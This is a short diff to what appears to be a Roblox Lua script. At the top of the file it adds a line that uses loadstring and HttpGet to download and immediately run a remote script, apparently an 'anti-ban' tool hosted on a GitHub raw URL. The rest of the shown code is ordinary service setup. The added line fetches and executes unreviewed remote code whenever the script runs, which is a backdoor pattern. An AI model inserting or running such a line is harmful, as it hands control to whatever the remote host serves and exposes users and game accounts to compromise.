@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Efield44444235364/Anti-ban/refs/heads/main/Noticing.lua"))()
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
